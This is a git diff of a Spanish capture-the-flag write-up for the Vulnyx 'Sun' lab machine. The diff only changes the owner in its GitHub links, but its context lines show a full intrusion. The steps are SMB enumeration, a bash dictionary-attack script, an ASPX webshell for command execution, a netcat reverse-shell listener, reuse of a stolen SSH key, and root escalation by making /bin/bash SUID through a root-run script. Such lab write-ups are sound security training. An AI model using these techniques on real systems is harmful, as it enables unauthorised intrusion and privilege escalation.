@@ -1,5 +1,5 @@
 # WRITEUP - SUN - VULNYX #
-![image](https://github.com/AlexGis99/Writeups/assets/82893511/6a02358e-2d01-4b51-805f-a652302827a1)
+![image](https://github.com/Koh4kU/Writeups/assets/82893511/6a02358e-2d01-4b51-805f-a652302827a1)
 ### Recon/Scanning network: ###
 **Antes de empezar, se tuvo que cambiar el direccionamiento IP a la mitad de la intrusión por temas de conexión entre VMs, por lo que ___10.0.2.5=192.168.1.13___**  
 Empezamos con un escaneo de la red para averiguar el direccionamiento ip de la máquina víctima:
@@ -27,7 +27,7 @@ PORT     STATE SERVICE      REASON
 Read data files from: /usr/bin/../share/nmap
 # Nmap done at Wed Apr  3 15:32:14 2024 -- 1 IP address (1 host up) scanned in 66.29 seconds
 ```
-[First scan](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan)  
+[First scan](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/nmap/scan)  
 Revisando la salida, podemos identificar los puertos:
 * SSH ports: 22
 * HTTP ports: 80, 8080  
@@ -71,7 +71,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Apr  3 15:43:06 2024 -- 1 IP address (1 host up) scanned in 26.17 seconds
 ```
-[Scan services](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan-services)  
+[Scan services](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/nmap/scan-services)  
 ## Enumeration
 Una vez realizados los escaneos procedemos a enumerar los servicios. Para esto haremos uso de los scripts de nmap y mientras están enumerando posibles usuarios, dominios, directorios y demás, le echaremos un vistazo a los servicios HTTP.
 ```console
@@ -100,7 +100,7 @@ Host script results:
 
 # Nmap done at Wed Apr  3 15:58:26 2024 -- 1 IP address (1 host up) scanned in 5.59 seconds
 ```
-[Nbstat result](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan-nbstat)  
+[Nbstat result](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/nmap/scan-nbstat)  
 Procedemos con enumerar samba. Primero intentamos entrar de forma directa con un usuario NULL y listar shares:
 ```console
 $ smbclient -L //10.0.2.4/ -U "" -N
@@ -116,7 +116,7 @@ Reconnecting with SMB1 for workgroup listing.
 Protocol negotiation to server 192.168.1.13 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
 Unable to connect with SMB1 -- no workgroup available
 ```
-[Enum users SMB](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/smbclient_enum)  
+[Enum users SMB](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/enumeration/smbclient_enum)  
 Podemos identificar un usuario "nobody" el cual tiene en la descripción de "disk": "file upload path". Esto puede ser un posible vector de entrada para insertar un fichero y realizar un RCE (Remote Command Execution). Procedemos a enumerar más a fondo SMB con enum4linux:
 ```console
 $ enum4linux -P 10.0.2.5
@@ -142,7 +142,7 @@ $ enum4linux -P 10.0.2.5
         [+] Account Lockout Threshold: None
         [+] Forced Log off Time: 37 days 6 hours 21 minutes
 ```
-[Enum password policy](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/passwordPolicy)  
+[Enum password policy](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/enumeration/passwordPolicy)  
 ```console
 $ enum4linux -R 10.0.2.5
 ```
@@ -157,10 +157,10 @@ S-1-5-21-3376172362-2708036654-1072164461-1000 SUN\punt4n0 (Local User)
 
 [+] Enumerating users using SID S-1-5-32 and logon username '', password ''
 ```
-[enum4linux enum users](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/enum4linux_enum)  
+[enum4linux enum users](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/enumeration/enum4linux_enum)  
 Podemos enumerar la página web e intentar analizarla viendo el código html de la página, pero no nos dará muchas pistas y es malgastar tiempo.
 ### Weaponization ###
-Observamos un usuario llamado "punt4n0", sabiendo esto y que la política de complejidad de contraseña es muy débil podemos intentar un ataque de diccionario por SMB. Al no haber podido realizar esto con Hydra (debido a que no soporta SMBv1), nos creamos un pequeño script en bash para realizar este ataque: [Script bash dictionary attack](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/scripts/dictionaryAtt_smb.sh)  
+Observamos un usuario llamado "punt4n0", sabiendo esto y que la política de complejidad de contraseña es muy débil podemos intentar un ataque de diccionario por SMB. Al no haber podido realizar esto con Hydra (debido a que no soporta SMBv1), nos creamos un pequeño script en bash para realizar este ataque: [Script bash dictionary attack](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/scripts/dictionaryAtt_smb.sh)  
 ```console
 #!/bin/bash
 
@@ -180,7 +180,7 @@ do
 	INTENTO=$((INTENTO+1))
 done
 ```
-El script nos devuelve una contraseña: "sunday".![image](https://github.com/AlexGis99/Writeups/assets/82893511/303dc0d8-42d1-405f-b2f2-3c11175131e4)  
+El script nos devuelve una contraseña: "sunday".![image](https://github.com/Koh4kU/Writeups/assets/82893511/303dc0d8-42d1-405f-b2f2-3c11175131e4)  
 En este caso hemos creado un script muy sencillo de bash que nos ha funcionado en poco tiempo, en caso de que esto se fuese de tiempo, tendríamos que agilizar la ejecución utilizando varios hilos o procesos.  
 Ya que tenemos la contraseña, podemos entrar en la máquina con SMB o para hacerlo más sencillo y cómodo, podemos montarnos una partición con el share del usuario:
 ```console
@@ -189,8 +189,8 @@ $ mount -t cifs -o user=punt4n0 -o password=sunday //10.0.2.5/punt4n0 /mnt/Sun
 ```
 ### Gaining access/Explotation ###
 Analizando el share que nos hemos montado en nuestra partición, observamos que tiene la misma estructura que el servicio web, por lo que podemos crear reverse shells o una ejecución de RCE y probar a explotarlo vía el servicio web. Probamos con diferentes webshells y en una de las peticiones, podemos ver que lo que se está ejecutando internamente es ASP.NET, por lo que ahora sí podemos crear una webshell/script en aspx, para poder vulnerar el servicio de forma correcta.
-[Different webshells](https://github.com/AlexGis99/Writeups/tree/main/Vulnyx/Sun/scripts)
-En mi caso funcionó un pequeño script que nos permite ejecutar un RCE mediante: "url?cmd=\<command\>". [RCE script aspx](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/scripts/last_reverse_shell.aspx) 
+[Different webshells](https://github.com/Koh4kU/Writeups/tree/main/Vulnyx/Sun/scripts)
+En mi caso funcionó un pequeño script que nos permite ejecutar un RCE mediante: "url?cmd=\<command\>". [RCE script aspx](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/scripts/last_reverse_shell.aspx) 
 ```console
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
@@ -235,7 +235,7 @@ Ejecutamos un comando como whoami para ver la respuesta del servidor:
 ```console
 $ curl http://10.0.2.5:8080/last_reverse_shell.aspx?cmd=whoami
 ```
-![image](https://github.com/AlexGis99/Writeups/assets/82893511/c7e4f8f6-b171-4fe1-acda-bcabf0f1ddc5)
+![image](https://github.com/Koh4kU/Writeups/assets/82893511/c7e4f8f6-b171-4fe1-acda-bcabf0f1ddc5)
 Tenemos respuesta del servicio por lo que hemos conseguido vulnerarlo a través de un RCE. Para un tratamiento más cómodo, nos enviamos una reverse shell a un puerto que dejaremos en escucha (443 por ejemplo):
 ```console
 $ nc -nlvp 443
@@ -253,13 +253,13 @@ $ reset xterm
 $ export TERM=xterm
 $ export SHELL=bash
 ```
-Ahora obtenemos una shell en condiciones y podemos proceder con el siguiente apartado. Recorremos el home del usuario y podemos visualizar la flag: [punt4n0 flag](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/flags/user.txt). Probamos lo mismo con el home de root, pero no tenemos permisos.
+Ahora obtenemos una shell en condiciones y podemos proceder con el siguiente apartado. Recorremos el home del usuario y podemos visualizar la flag: [punt4n0 flag](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/flags/user.txt). Probamos lo mismo con el home de root, pero no tenemos permisos.
 ### Persistence/Maintaing access ###
-Debido a que no tenemos un acceso "limpio" a la máquina, debemos comprometer la contraseña del usuario del sistema o acceder mediante clave pública. Buscando sobre el directorio home del usuario nos encontramos con un archivo que se llama "remember_password". Dentro de este archivo vemos una posible contraseña, por lo que probamos a entrar por ssh pero la máquina tiene restringido este acceso y nosotros como punt4n0 no tenemos permisos de modificar el archivo de configuración de ssh. Pero, nos encontramos con un directorio oculto llamado ".ssh" el cual dentro, tiene una clave privada RSA que podemos intentar utilizar para acceder por ssh. Nos copiamos la clave en nuestra máquina y la guardamos en un archivo: [id_rsa](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/contents/id_rsa).  
+Debido a que no tenemos un acceso "limpio" a la máquina, debemos comprometer la contraseña del usuario del sistema o acceder mediante clave pública. Buscando sobre el directorio home del usuario nos encontramos con un archivo que se llama "remember_password". Dentro de este archivo vemos una posible contraseña, por lo que probamos a entrar por ssh pero la máquina tiene restringido este acceso y nosotros como punt4n0 no tenemos permisos de modificar el archivo de configuración de ssh. Pero, nos encontramos con un directorio oculto llamado ".ssh" el cual dentro, tiene una clave privada RSA que podemos intentar utilizar para acceder por ssh. Nos copiamos la clave en nuestra máquina y la guardamos en un archivo: [id_rsa](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/contents/id_rsa).  
 ```console
 $ ssh -i id_rsa punt4n0@10.0.2.5
 ```
-![image](https://github.com/AlexGis99/Writeups/assets/82893511/d158d46a-2362-4ec9-9a2f-f73b1bd9779a)
+![image](https://github.com/Koh4kU/Writeups/assets/82893511/d158d46a-2362-4ec9-9a2f-f73b1bd9779a)
 Nos pide un passphrase, que si recordamos, podría ser la contraseña que obtuvimos del archivo de "remember_password", por lo que la introducimos y hemos obtenido acceso por ssh. Ahora podemos acceder cuándo queramos con un acceso más "limpio" que una reverse shell.
 ### Privilege escalation ###
 Empezamos esta fase identificando los permisos que tenemos sobre sudo, pero vemos que ni siquiera lo tiene.
@@ -303,7 +303,7 @@ $ crontab -l
 # m h  dom mon dow   command
 @reboot /usr/bin/fastcgi-mono-server4 /applications=/:/var/www/aspnet /socket=tcp:127.0.0.1:9000
 ```
-Vemos en [crontab](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/contents/crontab) que existe un proceso que se ejecuta cada vez que se reinicia la máquina. Por mucho que indaguemos dentro de este proceso, no parece haber manera de vulnerarlo.
+Vemos en [crontab](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/contents/crontab) que existe un proceso que se ejecuta cada vez que se reinicia la máquina. Por mucho que indaguemos dentro de este proceso, no parece haber manera de vulnerarlo.
 Pasamos a ver si hay procesos en ejecución que nos permita determinar una posible ejecución a la que vulnerar, pero no encontramos gran cosa (aparentemente).
 Podemos buscar dentro de los directorios del servicio web, pero no encontraremos ningún indicio de password o ejecución a la que poder explotar.
 Rebuscando en directorios como /tmp, /dev/shm y /opt, nos encontramos con un script en powershell (aparentemente) y vemos que nuestro usuario tiene permisos de lectura y escritura sobre el fichero, por lo que procedemos a abrirlo y determinar qué hace. El script simplemente ejecuta un $(id) en el fichero /dev/shm/out. Analizando este fichero, vemos que el que ejecuta el script es root (UID 0) y que se ejecuta de forma recurrente. Esto hace que podamos introducir cualquier código malicioso en bash y que root lo ejecute. Hay diferentes formas de escalar a root pero en este caso vamos a añadirle permisos de SUID a /bin/bash para poder ejecutar una bash como root desde nuestro usuario sin privilegios. Para esto añadimos dentro del script:
@@ -314,5 +314,5 @@ Esperamos hasta que se ejecute el script y cambie los permisos en el binario. Un
 ```console
 $ bash -p
 ```
-Listo, tenemos acceso como root. Dentro del directorio home de root, encontramos la flag que nos faltaba: [root flag](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/flags/root.txt)
+Listo, tenemos acceso como root. Dentro del directorio home de root, encontramos la flag que nos faltaba: [root flag](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Sun/flags/root.txt)
 
